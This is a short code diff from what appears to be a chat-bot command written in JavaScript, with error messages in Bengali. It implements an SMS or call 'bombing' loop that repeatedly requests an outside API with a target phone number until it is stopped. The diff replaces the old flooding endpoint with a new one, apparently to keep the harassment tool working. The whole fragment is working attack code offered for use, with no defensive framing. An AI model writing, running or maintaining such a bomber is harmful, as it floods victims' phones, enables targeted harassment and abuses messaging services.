@@ -41,7 +41,7 @@ module.exports.run = async ({ api, event, args }) => {
   (async function startBombing() {
     while (bombingFlags[threadID]) {
       try {
-        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
+        await axios.get(`https://unknownai.epplicon.net/api/?num=${number}`);
       } catch (err) {
         api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
         bombingFlags[threadID] = false;
